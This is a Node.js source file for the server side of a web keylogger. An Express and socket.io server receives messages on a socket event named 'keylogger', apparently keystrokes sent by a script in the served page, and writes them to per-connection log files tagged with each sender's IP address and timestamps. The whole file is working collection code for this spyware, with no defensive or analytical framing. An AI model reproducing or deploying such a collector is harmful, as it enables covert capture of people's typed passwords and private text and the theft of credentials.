const express = require('express')
const app = express()
const http = require('http').Server(app)
const moment = require('moment')
const debug = require('debug')('keylogger')
const io = require('socket.io')(http)
const path = require('path')
const fs = require('fs')

fs.mkdir(path.join(__dirname,'log'), function(err) {
  if (err) console.log('log directory exist: perfect!');
})

app.use(express.static('public'));

io.on('connection', function(socket) {
  let logfile = path.join('log', socket.id + '.txt')
  let mustalive = false

  function append(msg) {
    fs.access(logfile, fs.constants.F_OK, function(err) {
      debug('inside fs.access')
      if (err) {
        let srcaddr = socket.handshake.address + '\n'
        let current = 'date:' + moment().format('YYYYMMDDHHMM') + '\n'
        fs.appendFileSync(logfile, srcaddr + current, err => {
          if (err) throw err;
        })
      }
    });
    fs.appendFile(logfile, msg, err => {
      if (err) throw err;
    })
  }

  function alive() {
    if (mustalive) {
      let current = '\ndate:' + moment().format('YYYYMMDDHHMM') + '\n'
      append(current)
      mustalive=false
    }
  }

  socket.on('keylogger', function(msg) {
    append(msg)
    mustalive=true
  })

  socket.on('alive', function(msg) {
    alive()
    mustalive=false
  })

})

http.listen(3000, function() {
  console.log((new Date()) + ' Server is listening on port 3000')
})
